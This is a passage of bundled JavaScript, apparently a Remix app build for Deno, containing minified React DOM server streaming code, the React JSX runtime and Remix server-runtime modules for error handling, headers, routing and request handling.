    function Y(a, b) {
      if (a = a.onError(b), a != null && typeof a != "string")
        throw Error('onError returned something with a type other than "string". onError should return a string and may return null or undefined but must not return anything else. It received something of type "' + typeof a + '" instead');
      return a;
    }
    function Vc(a, b) {
      var c = a.onShellError;
      c(b), c = a.onFatalError, c(b), a.destination !== null ? (a.status = 2, da(a.destination, b)) : (a.status = 1, a.fatalError = b);
    }
    function Wc(a, b, c, d, f) {
      for (R = {}, Ac = b, U = 0, a = c(d, f); Cc; )
        Cc = !1, U = 0, Dc += 1, S = null, a = c(d, f);
      return Gc(), a;
    }
    function Xc(a, b, c, d) {
      var f = c.render(), e = d.childContextTypes;
      if (e != null) {
        var g = b.legacyContext;
        if (typeof c.getChildContext != "function")
          d = g;
        else {
          c = c.getChildContext();
          for (var h in c)
            if (!(h in e))
              throw Error(k(108, jc(d) || "Unknown", h));
          d = N({}, g, c);
        }
        b.legacyContext = d, Z(a, b, f), b.legacyContext = g;
      } else
        Z(a, b, f);
    }
    function Yc(a, b) {
      if (a && a.defaultProps) {
        b = N({}, b), a = a.defaultProps;
        for (var c in a)
          b[c] === void 0 && (b[c] = a[c]);
        return b;
      }
      return b;
    }
    function Zc(a, b, c, d, f) {
      if (typeof c == "function")
        if (c.prototype && c.prototype.isReactComponent) {
          f = lc(c, b.legacyContext);
          var e = c.contextType;
          e = new c(d, typeof e == "object" && e !== null ? e._currentValue : f), rc(e, c, d, f), Xc(a, b, e, c);
        } else {
          e = lc(c, b.legacyContext), f = Wc(a, b, c, d, e);
          var g = U !== 0;
          if (typeof f == "object" && f !== null && typeof f.render == "function" && f.$$typeof === void 0)
            rc(f, c, d, e), Xc(a, b, f, c);
          else if (g) {
            d = b.treeContext, b.treeContext = tc(d, 1, 0);
            try {
              Z(a, b, f);
            } finally {
              b.treeContext = d;
            }
          } else
            Z(a, b, f);
        }
      else if (typeof c == "string") {
        switch (f = b.blockedSegment, e = Sa(f.chunks, c, d, a.responseState, f.formatContext), f.lastPushedText = !1, g = f.formatContext, f.formatContext = Ba(g, c, d), $c(a, b, e), f.formatContext = g, c) {
          case "area":
          case "base":
          case "br":
          case "col":
          case "embed":
          case "hr":
          case "img":
          case "input":
          case "keygen":
          case "link":
          case "meta":
          case "param":
          case "source":
          case "track":
          case "wbr":
            break;
          default:
            f.chunks.push(Ta, u(c), Ua);
        }
        f.lastPushedText = !1;
      } else {
        switch (c) {
          case gc:
          case fc:
          case Wb:
          case Xb:
          case Vb:
            Z(a, b, d.children);
            return;
          case bc:
            Z(a, b, d.children);
            return;
          case ec:
            throw Error(k(343));
          case ac:
            a: {
              c = b.blockedBoundary, f = b.blockedSegment, e = d.fallback, d = d.children, g = /* @__PURE__ */ new Set();
              var h = { id: null, rootSegmentID: -1, parentFlushed: !1, pendingTasks: 0, forceClientRender: !1, completedSegments: [], byteSize: 0, fallbackAbortableTasks: g, errorDigest: null }, m = Sc(a, f.chunks.length, h, f.formatContext, !1, !1);
              f.children.push(m), f.lastPushedText = !1;
              var q = Sc(a, 0, null, f.formatContext, !1, !1);
              q.parentFlushed = !0, b.blockedBoundary = h, b.blockedSegment = q;
              try {
                if ($c(
                  a,
                  b,
                  d
                ), q.lastPushedText && q.textEmbedded && q.chunks.push(Ca), q.status = 1, ad(h, q), h.pendingTasks === 0)
                  break a;
              } catch (r) {
                q.status = 4, h.forceClientRender = !0, h.errorDigest = Y(a, r);
              } finally {
                b.blockedBoundary = c, b.blockedSegment = f;
              }
              b = Tc(a, e, c, m, g, b.legacyContext, b.context, b.treeContext), a.pingedTasks.push(b);
            }
            return;
        }
        if (typeof c == "object" && c !== null)
          switch (c.$$typeof) {
            case $b:
              if (d = Wc(a, b, c.render, d, f), U !== 0) {
                c = b.treeContext, b.treeContext = tc(c, 1, 0);
                try {
                  Z(a, b, d);
                } finally {
                  b.treeContext = c;
                }
              } else
                Z(a, b, d);
              return;
            case cc:
              c = c.type, d = Yc(c, d), Zc(a, b, c, d, f);
              return;
            case Yb:
              if (f = d.children, c = c._context, d = d.value, e = c._currentValue, c._currentValue = d, g = O, O = d = { parent: g, depth: g === null ? 0 : g.depth + 1, context: c, parentValue: e, value: d }, b.context = d, Z(a, b, f), a = O, a === null)
                throw Error(k(403));
              d = a.parentValue, a.context._currentValue = d === hc ? a.context._defaultValue : d, a = O = a.parent, b.context = a;
              return;
            case Zb:
              d = d.children, d = d(c._currentValue), Z(a, b, d);
              return;
            case dc:
              f = c._init, c = f(c._payload), d = Yc(c, d), Zc(a, b, c, d, void 0);
              return;
          }
        throw Error(k(
          130,
          c == null ? c : typeof c,
          ""
        ));
      }
    }
    function Z(a, b, c) {
      if (b.node = c, typeof c == "object" && c !== null) {
        switch (c.$$typeof) {
          case Tb:
            Zc(a, b, c.type, c.props, c.ref);
            return;
          case Ub:
            throw Error(k(257));
          case dc:
            var d = c._init;
            c = d(c._payload), Z(a, b, c);
            return;
        }
        if (ra(c)) {
          bd(a, b, c);
          return;
        }
        if (c === null || typeof c != "object" ? d = null : (d = ic && c[ic] || c["@@iterator"], d = typeof d == "function" ? d : null), d && (d = d.call(c))) {
          if (c = d.next(), !c.done) {
            var f = [];
            do
              f.push(c.value), c = d.next();
            while (!c.done);
            bd(a, b, f);
          }
          return;
        }
        throw a = Object.prototype.toString.call(c), Error(k(31, a === "[object Object]" ? "object with keys {" + Object.keys(c).join(", ") + "}" : a));
      }
      typeof c == "string" ? (d = b.blockedSegment, d.lastPushedText = Da(b.blockedSegment.chunks, c, a.responseState, d.lastPushedText)) : typeof c == "number" && (d = b.blockedSegment, d.lastPushedText = Da(b.blockedSegment.chunks, "" + c, a.responseState, d.lastPushedText));
    }
    function bd(a, b, c) {
      for (var d = c.length, f = 0; f < d; f++) {
        var e = b.treeContext;
        b.treeContext = tc(e, d, f);
        try {
          $c(a, b, c[f]);
        } finally {
          b.treeContext = e;
        }
      }
    }
    function $c(a, b, c) {
      var d = b.blockedSegment.formatContext, f = b.legacyContext, e = b.context;
      try {
        return Z(a, b, c);
      } catch (m) {
        if (Gc(), typeof m == "object" && m !== null && typeof m.then == "function") {
          c = m;
          var g = b.blockedSegment, h = Sc(a, g.chunks.length, null, g.formatContext, g.lastPushedText, !0);
          g.children.push(h), g.lastPushedText = !1, a = Tc(a, b.node, b.blockedBoundary, h, b.abortSet, b.legacyContext, b.context, b.treeContext).ping, c.then(a, a), b.blockedSegment.formatContext = d, b.legacyContext = f, b.context = e, Q(e);
        } else
          throw b.blockedSegment.formatContext = d, b.legacyContext = f, b.context = e, Q(e), m;
      }
    }
    function cd(a) {
      var b = a.blockedBoundary;
      a = a.blockedSegment, a.status = 3, dd(this, b, a);
    }
    function ed(a, b, c) {
      var d = a.blockedBoundary;
      a.blockedSegment.status = 3, d === null ? (b.allPendingTasks--, b.status !== 2 && (b.status = 2, b.destination !== null && b.destination.close())) : (d.pendingTasks--, d.forceClientRender || (d.forceClientRender = !0, a = c === void 0 ? Error(k(432)) : c, d.errorDigest = b.onError(a), d.parentFlushed && b.clientRenderedBoundaries.push(d)), d.fallbackAbortableTasks.forEach(function(a2) {
        return ed(a2, b, c);
      }), d.fallbackAbortableTasks.clear(), b.allPendingTasks--, b.allPendingTasks === 0 && (d = b.onAllReady, d()));
    }
    function ad(a, b) {
      if (b.chunks.length === 0 && b.children.length === 1 && b.children[0].boundary === null) {
        var c = b.children[0];
        c.id = b.id, c.parentFlushed = !0, c.status === 1 && ad(a, c);
      } else
        a.completedSegments.push(b);
    }
    function dd(a, b, c) {
      if (b === null) {
        if (c.parentFlushed) {
          if (a.completedRootSegment !== null)
            throw Error(k(389));
          a.completedRootSegment = c;
        }
        a.pendingRootTasks--, a.pendingRootTasks === 0 && (a.onShellError = X, b = a.onShellReady, b());
      } else
        b.pendingTasks--, b.forceClientRender || (b.pendingTasks === 0 ? (c.parentFlushed && c.status === 1 && ad(b, c), b.parentFlushed && a.completedBoundaries.push(b), b.fallbackAbortableTasks.forEach(cd, a), b.fallbackAbortableTasks.clear()) : c.parentFlushed && c.status === 1 && (ad(b, c), b.completedSegments.length === 1 && b.parentFlushed && a.partialBoundaries.push(b)));
      a.allPendingTasks--, a.allPendingTasks === 0 && (a = a.onAllReady, a());
    }
    function Uc(a) {
      if (a.status !== 2) {
        var b = O, c = Pc.current;
        Pc.current = Oc;
        var d = Nc;
        Nc = a.responseState;
        try {
          var f = a.pingedTasks, e;
          for (e = 0; e < f.length; e++) {
            var g = f[e], h = a, m = g.blockedSegment;
            if (m.status === 0) {
              Q(g.context);
              try {
                Z(h, g, g.node), m.lastPushedText && m.textEmbedded && m.chunks.push(Ca), g.abortSet.delete(g), m.status = 1, dd(h, g.blockedBoundary, m);
              } catch (G) {
                if (Gc(), typeof G == "object" && G !== null && typeof G.then == "function") {
                  var q = g.ping;
                  G.then(q, q);
                } else {
                  g.abortSet.delete(g), m.status = 4;
                  var r = g.blockedBoundary, v = G, A = Y(h, v);
                  if (r === null ? Vc(h, v) : (r.pendingTasks--, r.forceClientRender || (r.forceClientRender = !0, r.errorDigest = A, r.parentFlushed && h.clientRenderedBoundaries.push(r))), h.allPendingTasks--, h.allPendingTasks === 0) {
                    var F = h.onAllReady;
                    F();
                  }
                }
              } finally {
              }
            }
          }
          f.splice(0, e), a.destination !== null && fd(a, a.destination);
        } catch (G) {
          Y(a, G), Vc(a, G);
        } finally {
          Nc = d, Pc.current = c, c === Oc && Q(b);
        }
      }
    }
    function gd(a, b, c) {
      switch (c.parentFlushed = !0, c.status) {
        case 0:
          var d = c.id = a.nextSegmentId++;
          return c.lastPushedText = !1, c.textEmbedded = !1, a = a.responseState, p(b, Va), p(b, a.placeholderPrefix), a = u(d.toString(16)), p(b, a), t(b, Wa);
        case 1:
          c.status = 2;
          var f = !0;
          d = c.chunks;
          var e = 0;
          c = c.children;
          for (var g = 0; g < c.length; g++) {
            for (f = c[g]; e < f.index; e++)
              p(b, d[e]);
            f = hd(a, b, f);
          }
          for (; e < d.length - 1; e++)
            p(b, d[e]);
          return e < d.length && (f = t(b, d[e])), f;
        default:
          throw Error(k(390));
      }
    }
    function hd(a, b, c) {
      var d = c.boundary;
      if (d === null)
        return gd(a, b, c);
      if (d.parentFlushed = !0, d.forceClientRender)
        d = d.errorDigest, t(b, $a), p(b, bb), d && (p(b, db), p(b, u(C(d))), p(b, cb)), t(b, eb), gd(a, b, c);
      else if (0 < d.pendingTasks) {
        d.rootSegmentID = a.nextSegmentId++, 0 < d.completedSegments.length && a.partialBoundaries.push(d);
        var f = a.responseState, e = f.nextSuspenseID++;
        f = w(f.boundaryPrefix + e.toString(16)), d = d.id = f, fb(b, a.responseState, d), gd(a, b, c);
      } else if (d.byteSize > a.progressiveChunkSize)
        d.rootSegmentID = a.nextSegmentId++, a.completedBoundaries.push(d), fb(b, a.responseState, d.id), gd(a, b, c);
      else {
        if (t(b, Xa), c = d.completedSegments, c.length !== 1)
          throw Error(k(391));
        hd(a, b, c[0]);
      }
      return t(b, ab);
    }
    function id(a, b, c) {
      return Bb(b, a.responseState, c.formatContext, c.id), hd(a, b, c), Cb(b, c.formatContext);
    }
    function jd(a, b, c) {
      for (var d = c.completedSegments, f = 0; f < d.length; f++)
        kd(a, b, c, d[f]);
      if (d.length = 0, a = a.responseState, d = c.id, c = c.rootSegmentID, p(b, a.startInlineScript), a.sentCompleteBoundaryFunction ? p(b, Jb) : (a.sentCompleteBoundaryFunction = !0, p(b, Ib)), d === null)
        throw Error(k(395));
      return c = u(c.toString(16)), p(b, d), p(b, Kb), p(b, a.segmentPrefix), p(b, c), t(b, Lb);
    }
    function kd(a, b, c, d) {
      if (d.status === 2)
        return !0;
      var f = d.id;
      if (f === -1) {
        if ((d.id = c.rootSegmentID) === -1)
          throw Error(k(392));
        return id(a, b, d);
      }
      return id(a, b, d), a = a.responseState, p(b, a.startInlineScript), a.sentCompleteSegmentFunction ? p(b, Eb) : (a.sentCompleteSegmentFunction = !0, p(b, Db)), p(b, a.segmentPrefix), f = u(f.toString(16)), p(b, f), p(b, Gb), p(b, a.placeholderPrefix), p(b, f), t(b, Hb);
    }
    function fd(a, b) {
      l = new Uint8Array(512), n = 0;
      try {
        var c = a.completedRootSegment;
        if (c !== null && a.pendingRootTasks === 0) {
          hd(a, b, c), a.completedRootSegment = null;
          var d = a.responseState.bootstrapChunks;
          for (c = 0; c < d.length - 1; c++)
            p(b, d[c]);
          c < d.length && t(b, d[c]);
        }
        var f = a.clientRenderedBoundaries, e;
        for (e = 0; e < f.length; e++) {
          var g = f[e];
          d = b;
          var h = a.responseState, m = g.id, q = g.errorDigest, r = g.errorMessage, v = g.errorComponentStack;
          if (p(d, h.startInlineScript), h.sentClientRenderFunction ? p(d, Nb) : (h.sentClientRenderFunction = !0, p(
            d,
            Mb
          )), m === null)
            throw Error(k(395));
          if (p(d, m), p(d, Ob), (q || r || v) && (p(d, Qb), p(d, u(Sb(q || "")))), (r || v) && (p(d, Qb), p(d, u(Sb(r || "")))), v && (p(d, Qb), p(d, u(Sb(v)))), !t(d, Pb)) {
            a.destination = null, e++, f.splice(0, e);
            return;
          }
        }
        f.splice(0, e);
        var A = a.completedBoundaries;
        for (e = 0; e < A.length; e++)
          if (!jd(a, b, A[e])) {
            a.destination = null, e++, A.splice(0, e);
            return;
          }
        A.splice(0, e), ba(b), l = new Uint8Array(512), n = 0;
        var F = a.partialBoundaries;
        for (e = 0; e < F.length; e++) {
          var G = F[e];
          a: {
            f = a, g = b;
            var ma = G.completedSegments;
            for (h = 0; h < ma.length; h++)
              if (!kd(
                f,
                g,
                G,
                ma[h]
              )) {
                h++, ma.splice(0, h);
                var Fb = !1;
                break a;
              }
            ma.splice(0, h), Fb = !0;
          }
          if (!Fb) {
            a.destination = null, e++, F.splice(0, e);
            return;
          }
        }
        F.splice(0, e);
        var na = a.completedBoundaries;
        for (e = 0; e < na.length; e++)
          if (!jd(a, b, na[e])) {
            a.destination = null, e++, na.splice(0, e);
            return;
          }
        na.splice(0, e);
      } finally {
        ba(b), a.allPendingTasks === 0 && a.pingedTasks.length === 0 && a.clientRenderedBoundaries.length === 0 && a.completedBoundaries.length === 0 && b.close();
      }
    }
    function ld(a, b) {
      try {
        var c = a.abortableTasks;
        c.forEach(function(c2) {
          return ed(c2, a, b);
        }), c.clear(), a.destination !== null && fd(a, a.destination);
      } catch (d) {
        Y(a, d), Vc(a, d);
      }
    }
    exports.renderToReadableStream = function(a, b) {
      return new Promise(function(c, d) {
        var f, e, g = new Promise(function(a2, b2) {
          e = a2, f = b2;
        }), h = Rc(a, za(b ? b.identifierPrefix : void 0, b ? b.nonce : void 0, b ? b.bootstrapScriptContent : void 0, b ? b.bootstrapScripts : void 0, b ? b.bootstrapModules : void 0), Aa(b ? b.namespaceURI : void 0), b ? b.progressiveChunkSize : void 0, b ? b.onError : void 0, e, function() {
          var a2 = new ReadableStream({ type: "bytes", pull: function(a3) {
            if (h.status === 1)
              h.status = 2, da(a3, h.fatalError);
            else if (h.status !== 2 && h.destination === null) {
              h.destination = a3;
              try {
                fd(h, a3);
              } catch (A) {
                Y(h, A), Vc(h, A);
              }
            }
          }, cancel: function() {
            ld(h);
          } }, { highWaterMark: 0 });
          a2.allReady = g, c(a2);
        }, function(a2) {
          g.catch(function() {
          }), d(a2);
        }, f);
        if (b && b.signal) {
          var m = b.signal, q = function() {
            ld(h, m.reason), m.removeEventListener("abort", q);
          };
          m.addEventListener("abort", q);
        }
        Uc(h);
      });
    };
    exports.version = "18.2.0";
  }
});

// node_modules/react-dom/server.browser.js
var require_server_browser = __commonJS({
  "node_modules/react-dom/server.browser.js"(exports) {
    "use strict";
    var l, s;
    l = require_react_dom_server_legacy_browser_production_min(), s = require_react_dom_server_browser_production_min();
    exports.version = l.version;
    exports.renderToString = l.renderToString;
    exports.renderToStaticMarkup = l.renderToStaticMarkup;
    exports.renderToNodeStream = l.renderToNodeStream;
    exports.renderToStaticNodeStream = l.renderToStaticNodeStream;
    exports.renderToReadableStream = s.renderToReadableStream;
  }
});

// node_modules/react/cjs/react-jsx-runtime.production.min.js
var require_react_jsx_runtime_production_min = __commonJS({
  "node_modules/react/cjs/react-jsx-runtime.production.min.js"(exports) {
    "use strict";
    var f = require_react(), k = Symbol.for("react.element"), l = Symbol.for("react.fragment"), m = Object.prototype.hasOwnProperty, n = f.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner, p = { key: !0, ref: !0, __self: !0, __source: !0 };
    function q(c, a, g) {
      var b, d = {}, e = null, h = null;
      g !== void 0 && (e = "" + g), a.key !== void 0 && (e = "" + a.key), a.ref !== void 0 && (h = a.ref);
      for (b in a)
        m.call(a, b) && !p.hasOwnProperty(b) && (d[b] = a[b]);
      if (c && c.defaultProps)
        for (b in a = c.defaultProps, a)
          d[b] === void 0 && (d[b] = a[b]);
      return { $$typeof: k, type: c, key: e, ref: h, props: d, _owner: n.current };
    }
    exports.Fragment = l;
    exports.jsx = q;
    exports.jsxs = q;
  }
});

// node_modules/react/jsx-runtime.js
var require_jsx_runtime = __commonJS({
  "node_modules/react/jsx-runtime.js"(exports, module) {
    "use strict";
    module.exports = require_react_jsx_runtime_production_min();
  }
});

// server.ts
import { serve } from "https://deno.land/std@0.128.0/http/server.ts";

// node_modules/@remix-run/server-runtime/dist/esm/responses.js
init_router();

// node_modules/@remix-run/server-runtime/dist/esm/errors.js
init_router();

// node_modules/@remix-run/server-runtime/dist/esm/mode.js
var ServerMode = /* @__PURE__ */ function(ServerMode2) {
  return ServerMode2.Development = "development", ServerMode2.Production = "production", ServerMode2.Test = "test", ServerMode2;
}({});
function isServerMode(value) {
  return value === ServerMode.Development || value === ServerMode.Production || value === ServerMode.Test;
}

// node_modules/@remix-run/server-runtime/dist/esm/errors.js
function sanitizeError(error, serverMode) {
  if (error instanceof Error && serverMode !== ServerMode.Development) {
    let sanitized = new Error("Unexpected Server Error");
    return sanitized.stack = void 0, sanitized;
  }
  return error;
}
function sanitizeErrors(errors, serverMode) {
  return Object.entries(errors).reduce((acc, [routeId, error]) => Object.assign(acc, {
    [routeId]: sanitizeError(error, serverMode)
  }), {});
}
function serializeError(error, serverMode) {
  let sanitized = sanitizeError(error, serverMode);
  return {
    message: sanitized.message,
    stack: sanitized.stack
  };
}
function serializeErrors(errors, serverMode) {
  if (!errors)
    return null;
  let entries = Object.entries(errors), serialized = {};
  for (let [key, val] of entries)
    if (isRouteErrorResponse(val))
      serialized[key] = {
        ...val,
        __type: "RouteErrorResponse"
      };
    else if (val instanceof Error) {
      let sanitized = sanitizeError(val, serverMode);
      serialized[key] = {
        message: sanitized.message,
        stack: sanitized.stack,
        __type: "Error",
        // If this is a subclass (i.e., ReferenceError), send up the type so we
        // can re-create the same type during hydration.  This will only apply
        // in dev mode since all production errors are sanitized to normal
        // Error instances
        ...sanitized.name !== "Error" ? {
          __subType: sanitized.name
        } : {}
      };
    } else
      serialized[key] = val;
  return serialized;
}

// node_modules/@remix-run/server-runtime/dist/esm/responses.js
var json3 = (data, init = {}) => json(data, init);
var redirect3 = (url, init = 302) => redirect(url, init);
function isDeferredData2(value) {
  let deferred = value;
  return deferred && typeof deferred == "object" && typeof deferred.data == "object" && typeof deferred.subscribe == "function" && typeof deferred.cancel == "function" && typeof deferred.resolveData == "function";
}
function isResponse2(value) {
  return value != null && typeof value.status == "number" && typeof value.statusText == "string" && typeof value.headers == "object" && typeof value.body < "u";
}
var redirectStatusCodes2 = /* @__PURE__ */ new Set([301, 302, 303, 307, 308]);
function isRedirectStatusCode(statusCode) {
  return redirectStatusCodes2.has(statusCode);
}
function isRedirectResponse2(response) {
  return isRedirectStatusCode(response.status);
}
function isTrackedPromise2(value) {
  return value != null && typeof value.then == "function" && value._tracked === !0;
}
var DEFERRED_VALUE_PLACEHOLDER_PREFIX = "__deferred_promise:";
function createDeferredReadableStream(deferredData, signal, serverMode) {
  let encoder = new TextEncoder();
  return new ReadableStream({
    async start(controller) {
      let criticalData = {}, preresolvedKeys = [];
      for (let [key, value] of Object.entries(deferredData.data))
        isTrackedPromise2(value) ? (criticalData[key] = `${DEFERRED_VALUE_PLACEHOLDER_PREFIX}${key}`, (typeof value._data < "u" || typeof value._error < "u") && preresolvedKeys.push(key)) : criticalData[key] = value;
      controller.enqueue(encoder.encode(JSON.stringify(criticalData) + `

`));
      for (let preresolvedKey of preresolvedKeys)
        enqueueTrackedPromise(controller, encoder, preresolvedKey, deferredData.data[preresolvedKey], serverMode);
      let unsubscribe = deferredData.subscribe((aborted, settledKey) => {
        settledKey && enqueueTrackedPromise(controller, encoder, settledKey, deferredData.data[settledKey], serverMode);
      });
      await deferredData.resolveData(signal), unsubscribe(), controller.close();
    }
  });
}
function enqueueTrackedPromise(controller, encoder, settledKey, promise, serverMode) {
  "_error" in promise ? controller.enqueue(encoder.encode("error:" + JSON.stringify({
    [settledKey]: promise._error instanceof Error ? serializeError(promise._error, serverMode) : promise._error
  }) + `

`)) : controller.enqueue(encoder.encode("data:" + JSON.stringify({
    [settledKey]: promise._data ?? null
  }) + `

`));
}

// node_modules/@remix-run/server-runtime/dist/esm/server.js
init_router();

// node_modules/@remix-run/server-runtime/dist/esm/entry.js
function createEntryRouteModules(manifest) {
  return Object.keys(manifest).reduce((memo, routeId) => (memo[routeId] = manifest[routeId].module, memo), {});
}

// node_modules/@remix-run/server-runtime/dist/esm/headers.js
var import_set_cookie_parser = __toESM(require_set_cookie());
function getDocumentHeadersRR(build, context) {
  let boundaryIdx = context.errors ? context.matches.findIndex((m) => context.errors[m.route.id]) : -1, matches = boundaryIdx >= 0 ? context.matches.slice(0, boundaryIdx + 1) : context.matches, errorHeaders;
  if (boundaryIdx >= 0) {
    let {
      actionHeaders,
      actionData,
      loaderHeaders,
      loaderData
    } = context;
    context.matches.slice(boundaryIdx).some((match) => {
      let id = match.route.id;
      return actionHeaders[id] && (!actionData || actionData[id] === void 0) ? errorHeaders = actionHeaders[id] : loaderHeaders[id] && loaderData[id] === void 0 && (errorHeaders = loaderHeaders[id]), errorHeaders != null;
    });
  }
  return matches.reduce((parentHeaders, match, idx) => {
    let {
      id
    } = match.route, routeModule = build.routes[id].module, loaderHeaders = context.loaderHeaders[id] || new Headers(), actionHeaders = context.actionHeaders[id] || new Headers(), includeErrorHeaders = errorHeaders != null && idx === matches.length - 1, includeErrorCookies = includeErrorHeaders && errorHeaders !== loaderHeaders && errorHeaders !== actionHeaders;
    if (routeModule.headers == null && build.future.v2_headers) {
      let headers2 = new Headers(parentHeaders);
      return includeErrorCookies && prependCookies(errorHeaders, headers2), prependCookies(actionHeaders, headers2), prependCookies(loaderHeaders, headers2), headers2;
    }
    let headers = new Headers(routeModule.headers ? typeof routeModule.headers == "function" ? routeModule.headers({
      loaderHeaders,
      parentHeaders,
      actionHeaders,
      errorHeaders: includeErrorHeaders ? errorHeaders : void 0
    }) : routeModule.headers : void 0);
    return includeErrorCookies && prependCookies(errorHeaders, headers), prependCookies(actionHeaders, headers), prependCookies(loaderHeaders, headers), prependCookies(parentHeaders, headers), headers;
  }, new Headers());
}
function prependCookies(parentHeaders, childHeaders) {
  let parentSetCookieString = parentHeaders.get("Set-Cookie");
  parentSetCookieString && (0, import_set_cookie_parser.splitCookiesString)(parentSetCookieString).forEach((cookie) => {
    childHeaders.append("Set-Cookie", cookie);
  });
}

// node_modules/@remix-run/server-runtime/dist/esm/invariant.js
function invariant2(value, message) {
  if (value === !1 || value === null || typeof value > "u")
    throw console.error("The following error is a bug in Remix; please open an issue! https://github.com/remix-run/remix/issues/new"), new Error(message);
}

// node_modules/@remix-run/server-runtime/dist/esm/routeMatching.js
init_router();
function matchServerRoutes(routes2, pathname) {
  let matches = matchRoutes(routes2, pathname);
  return matches ? matches.map((match) => ({
    params: match.params,
    pathname: match.pathname,
    route: match.route
  })) : null;
}

// node_modules/@remix-run/server-runtime/dist/esm/data.js
async function callRouteActionRR({
  loadContext,
  action: action2,
  params,
  request,
  routeId
}) {
  let result = await action2({
    request: stripDataParam(stripIndexParam(request)),
    context: loadContext,
    params
  });
  if (result === void 0)
    throw new Error(`You defined an action for route "${routeId}" but didn't return anything from your \`action\` function. Please return a value or \`null\`.`);
  return isResponse2(result) ? result : json3(result);
}
async function callRouteLoaderRR({
  loadContext,
  loader,
  params,
  request,
  routeId
}) {
  let result = await loader({
    request: stripDataParam(stripIndexParam(request)),
    context: loadContext,
    params
  });
  if (result === void 0)
    throw new Error(`You defined a loader for route "${routeId}" but didn't return anything from your \`loader\` function. Please return a value or \`null\`.`);
  return isDeferredData2(result) ? result.init && isRedirectStatusCode(result.init.status || 200) ? redirect3(new Headers(result.init.headers).get("Location"), result.init) : result : isResponse2(result) ? result : json3(result);
}
function stripIndexParam(request) {
  let url = new URL(request.url), indexValues = url.searchParams.getAll("index");
  url.searchParams.delete("index");
  let indexValuesToKeep = [];
  for (let indexValue of indexValues)
    indexValue && indexValuesToKeep.push(indexValue);
  for (let toKeep of indexValuesToKeep)
    url.searchParams.append("index", toKeep);
  return new Request(url.href, request);
}
function stripDataParam(request) {
  let url = new URL(request.url);
  return url.searchParams.delete("_data"), new Request(url.href, request);
}

// node_modules/@remix-run/server-runtime/dist/esm/routes.js
function groupRoutesByParentId(manifest) {
  let routes2 = {};
  return Object.values(manifest).forEach((route) => {
    let parentId = route.parentId || "";
    routes2[parentId] || (routes2[parentId] = []), routes2[parentId].push(route);
  }), routes2;
}
function createRoutes(manifest, parentId = "", routesByParentId = groupRoutesByParentId(manifest)) {
  return (routesByParentId[parentId] || []).map((route) => ({
    ...route,
    children: createRoutes(manifest, route.id, routesByParentId)
  }));
}
function createStaticHandlerDataRoutes(manifest, future2, parentId = "", routesByParentId = groupRoutesByParentId(manifest)) {
  return (routesByParentId[parentId] || []).map((route) => {
    let commonRoute = {
      // Always include root due to default boundaries
      hasErrorBoundary: future2.v2_errorBoundary === !0 ? route.id === "root" || route.module.ErrorBoundary != null : route.id === "root" || route.module.CatchBoundary != null || route.module.ErrorBoundary != null,
      id: route.id,
      path: route.path,
      loader: route.module.loader ? (args) => callRouteLoaderRR({
        request: args.request,
        params: args.params,
        loadContext: args.context,
        loader: route.module.loader,
        routeId: route.id
      }) : void 0,
      action: route.module.action ? (args) => callRouteActionRR({
        request: args.request,
        params: args.params,
        loadContext: args.context,
        action: route.module.action,
        routeId: route.id
      }) : void 0,
      handle: route.module.handle
    };
    return route.index ? {
      index: !0,
      ...commonRoute
    } : {
      caseSensitive: route.caseSensitive,
      children: createStaticHandlerDataRoutes(manifest, future2, route.id, routesByParentId),
      ...commonRoute
    };
  });
}

// node_modules/@remix-run/server-runtime/dist/esm/markup.js
var ESCAPE_LOOKUP = {
  "&": "\\u0026",
  ">": "\\u003e",
  "<": "\\u003c",
  "\u2028": "\\u2028",
  "\u2029": "\\u2029"
}, ESCAPE_REGEX = /[&><\u2028\u2029]/g;
function escapeHtml(html) {
  return html.replace(ESCAPE_REGEX, (match) => ESCAPE_LOOKUP[match]);
}

// node_modules/@remix-run/server-runtime/dist/esm/serverHandoff.js
function createServerHandoffString(serverHandoff) {
  return escapeHtml(JSON.stringify(serverHandoff));
}

// node_modules/@remix-run/server-runtime/dist/esm/server.js
var createRequestHandler = (build, mode) => {
  let routes2 = createRoutes(build.routes), dataRoutes = createStaticHandlerDataRoutes(build.routes, build.future), serverMode = isServerMode(mode) ? mode : ServerMode.Production, staticHandler = createStaticHandler(dataRoutes), errorHandler = build.entry.module.handleError || ((error, {
    request
  }) => {
    serverMode !== ServerMode.Test && !request.signal.aborted && console.error(error);
  });
  return async function(request, loadContext = {}) {
    let url = new URL(request.url), matches = matchServerRoutes(routes2, url.pathname), handleError = (error) => errorHandler(error, {
      context: loadContext,
      params: matches && matches.length > 0 ? matches[0].params : {},
      request
    }), response;
    if (url.searchParams.has("_data")) {
      let routeId = url.searchParams.get("_data");
      if (response = await handleDataRequestRR(serverMode, staticHandler, routeId, request, loadContext, handleError), build.entry.module.handleDataRequest) {
        var _matches$find;
        response = await build.entry.module.handleDataRequest(response, {
          context: loadContext,
          params: (matches == null || (_matches$find = matches.find((m) => m.route.id == routeId)) === null || _matches$find === void 0 ? void 0 : _matches$find.params) || {},
          request
        });
      }
    } else
      matches && matches[matches.length - 1].route.module.default == null ? response = await handleResourceRequestRR(serverMode, staticHandler, matches.slice(-1)[0].route.id, request, loadContext, handleError) : response = await handleDocumentRequestRR(serverMode, build, staticHandler, request, loadContext, handleError);
    return request.method === "HEAD" ? new Response(null, {
      headers: response.headers,
      status: response.status,
      statusText: response.statusText
    }) : response;
  };
};
async function handleDataRequestRR(serverMode, staticHandler, routeId, request, loadContext, handleError) {
  try {
    let response = await staticHandler.queryRoute(request, {
      routeId,
      requestContext: loadContext
    });
    if (isRedirectResponse2(response)) {
      let headers = new Headers(response.headers);
      return headers.set("X-Remix-Redirect", headers.get("Location")), headers.set("X-Remix-Status", response.status), headers.delete("Location"), response.headers.get("Set-Cookie") !== null && headers.set("X-Remix-Revalidate", "yes"), new Response(null, {
        status: 204,
        headers
      });
    }
    if (UNSAFE_DEFERRED_SYMBOL in response) {
      let deferredData = response[UNSAFE_DEFERRED_SYMBOL], body = createDeferredReadableStream(deferredData, request.signal, serverMode), init = deferredData.init || {}, headers = new Headers(init.headers);
      return headers.set("Content-Type", "text/remix-deferred"), headers.set("X-Remix-Response", "yes"), init.headers = headers, new Response(body, init);
    }
    return response.headers.set("X-Remix-Response", "yes"), response;
  } catch (error) {
    if (isResponse2(error))
      return error.headers.set("X-Remix-Catch", "yes"), error;
    if (isRouteErrorResponse(error))
      return error.error && handleError(error.error), errorResponseToJson(error, serverMode);
    let errorInstance = error instanceof Error ? error : new Error("Unexpected Server Error");
